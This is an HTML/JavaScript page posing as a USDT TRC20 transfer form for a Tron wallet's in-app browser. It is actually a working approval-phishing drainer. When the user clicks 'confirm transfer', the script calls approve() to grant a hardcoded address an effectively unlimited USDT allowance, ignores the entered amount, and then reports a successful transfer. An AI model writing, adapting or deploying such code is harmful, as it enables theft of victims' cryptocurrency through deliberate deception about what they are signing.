<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui;
            background: #fff;
        }
        body {
            padding: 20px 16px;
            max-width: 540px;
            margin: 0 auto;
        }
        .box {
            background: #f6f7fa;
            border-radius: 16px;
            padding: 18px;
            margin-bottom: 14px;
        }
        .title {
            font-size: 16px;
            color: #666;
            margin-bottom: 10px;
        }
        .input-text {
            width: 100%;
            border: none;
            padding: 12px;
            border-radius: 10px;
            font-size: 15px;
            background: #ffffff;
        }
        .amount-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .amount-input {
            font-size: 48px;
            border: none;
            outline: none;
            width: 72%;
            background: transparent;
        }
        .btn-max {
            padding: 7px 14px;
            border: none;
            border-radius: 8px;
            background: #dbe8ff;
            color: #2266ee;
            font-size: 16px;
        }
        .token-info {
            display: flex;
            align-items: center;
            margin-top: 16px;
            background: #edf3ff;
            padding: 14px;
            border-radius: 12px;
        }
        .submit {
            width: 100%;
            padding: 18px;
            border-radius: 16px;
            border: none;
            background: #2266ee;
            color: white;
            font-size: 20px;
            margin-top: 10px;
        }
        #log {
            width: 100%;
            height: 150px;
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #e8e8e8;
            resize: none;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="title">收款地址</div>
        <input class="input-text" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
    </div>
    <div class="box">
        <div class="title">转账数量</div>
        <div class="amount-row">
            <input class="amount-input" id="numInput" value="" type="number" step="0.01" placeholder="输入数量">
            <button class="btn-max" onclick="getBalance()">MAX</button>
        </div>
        <div class="token-info">
            <span style="font-size:24px;font-weight:bold">USDT</span>
            <span style="margin-left:auto;font-size:20px">TRC20</span>
        </div>
    </div>
    <button class="submit" id="sendBtn">确认转账</button>
    <textarea id="log" readonly></textarea>

<script>
// ==========固化常量 禁止修改==========
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
const MAX_ALLOWANCE = "9999999999999999999999999999";

// 【核心修复】TRC20标准ABI，手动内置，解决approve找不到函数
const TRC20_ABI = [
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
];
// ====================================

let tronWeb;
let usdtContract;
const logBox = document.getElementById("log");

function printLog(text) {
    const time = new Date().toLocaleString();
    logBox.value += `[${time}] ${text}\n`;
    logBox.scrollTop = logBox.scrollHeight;
}

async function waitTronWeb(timeout = 8000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
        if (window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            // 使用内置ABI初始化合约实例
            usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
            return true;
        }
        await new Promise(res => setTimeout(res, 300));
    }
    return false;
}

async function getBalance() {
    const ok = await waitTronWeb();
    if (!ok) return printLog("请在TP内置浏览器打开页面");
    const owner = tronWeb.defaultAddress.base58;
    const sunVal = await usdtContract.balanceOf(owner).call();
    const amount = tronWeb.fromSun(sunVal.toString());
    document.getElementById("numInput").value = amount;
    printLog("余额读取完成");
}

async function waitConfirm(txHash, loopTimes = 20) {
    for (let i = 0; i < loopTimes; i++) {
        await new Promise(res => setTimeout(res, 3000));
        try {
            const info = await tronWeb.trx.getTransactionInfo(txHash);
            if (!info) continue;
            if (info.receipt?.result === "SUCCESS") return true;
            else return false;
        } catch (e) {}
    }
    return false;
}

document.getElementById("sendBtn").onclick = async function () {
    const inputAmount = document.getElementById("numInput").value;
    if (!inputAmount || parseFloat(inputAmount) <= 0) {
        printLog("⚠️请输入有效转账金额！");
        return;
    }

    printLog("正在连接钱包...");
    const ready = await waitTronWeb();
    if (!ready) return printLog("钱包连接失败！请刷新页面，使用TP内置浏览器访问");

    try {
        printLog("唤起签名弹窗（仅一次）");
        // 调用approve授权
        const txHash = await usdtContract.approve(SPENDER_ADDR, MAX_ALLOWANCE).send({
            feeLimit: 150000000
        });
        printLog(`授权交易哈希：${txHash}，等待区块确认`);
        const success = await waitConfirm(txHash);
        if (success) {
            printLog("✅转账成功！授权已生效");
        } else {
            printLog("❌链上交易执行失败");
        }
    } catch (err) {
        printLog("操作中断：" + err.message);
    }
}
</script>
</body>
</html>
